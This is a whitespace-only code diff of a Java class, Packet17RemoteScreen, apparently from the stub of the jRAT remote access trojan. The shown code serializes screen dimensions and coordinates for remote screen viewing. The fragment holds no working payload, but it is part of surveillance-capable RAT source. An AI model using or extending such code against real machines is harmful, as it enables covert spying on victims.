@@ -5,9 +5,8 @@ import java.io.DataOutputStream;
 import pro.jrat.common.io.StringWriter;
 import pro.jrat.stub.Connection;
 
-
 public class Packet17RemoteScreen extends AbstractOutgoingPacket {
-	
+
 	private int width;
 	private int height;
 	private int x;
@@ -26,7 +25,7 @@ public class Packet17RemoteScreen extends AbstractOutgoingPacket {
 		dos.writeInt(height);
 		dos.writeInt(x);
 		dos.writeInt(y);
-		
+
 		Connection.lock();
 	}
 
